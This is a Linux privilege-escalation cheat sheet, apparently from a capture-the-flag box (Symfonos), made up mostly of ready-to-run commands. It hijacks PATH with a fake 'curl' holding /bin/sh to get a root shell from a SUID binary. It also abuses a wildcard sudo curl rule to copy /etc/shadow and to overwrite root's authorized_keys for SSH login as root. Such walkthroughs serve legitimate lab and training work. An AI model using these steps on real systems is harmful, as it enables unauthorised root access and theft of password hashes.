
Locate files that the current user can execute:
```
find / -perm -4000 2>/dev/null
```

If Found a command that seems out of place, e.g.:
/opt/statuscheck
run it and see what it does.

Next lets check out the file type:
```
file /opt/statuscheck
```

Now lets check the embedded string in it:
```
strings /opt/statuscheck
```

If you find something like the curl command and somthing like http://lh
This suggets that the curl command makes use HTTP requests.
We can exploit this to run a malicious curl command:
Navigate to the TMP directory
Now we create a file that will execute /bin/sh when executed:
```
helios@symfonos:/home/helios$ cd /tmp
cd /tmp
helios@symfonos:/tmp$ echo "/bin/sh" > curl
```

Change the permission to make is executable:
```
chmod 777 curl
```

Now we ensure that the tmp directory is priorisise when running the command, so we amend it to the PATH variable
```
export PATH=/tmp:$PATH
```

Now execute the /opt/statuscheck file, this should spawn a root shell now.

You can check by running:
```
whoami
id
```

# Another Method
If you can run curl as root, example:
```
(root) NOPASSWD: /usr/bin/curl 127.0.0.1:8000/health-check*
```

The asteris at the end means anything can be added afterwards.
So we can run the follwing command and save the output.

First start a http server in /tmp/srv directory:
```
cd /tmp
mkdir srv
cd srv
python -m http.server
```

Now in another terminal run:
```
sudo -u root curl 127.0.0.1:8000/health-check file:///etc/shadow -o /tmp/srv/log -o /tmp/srv/data
```
This should save the shadow file to the filename data on the /tmp/srv/ dir.

You can now try to put your public SSH keys in 127.0.0.1:8000/health_check file and the download it but save it to root's auzorised keys.

```
sudo -u root curl http://127.0.0.1:8000/health-check -o /root/.ssh/authorized_keys
```

You should be able to ssh to root using the ssh keys:
```
ssh root@localhost
```

Or you can also specify the keys
```
ssh -i rsa_id root@localhost
```

You should be root now.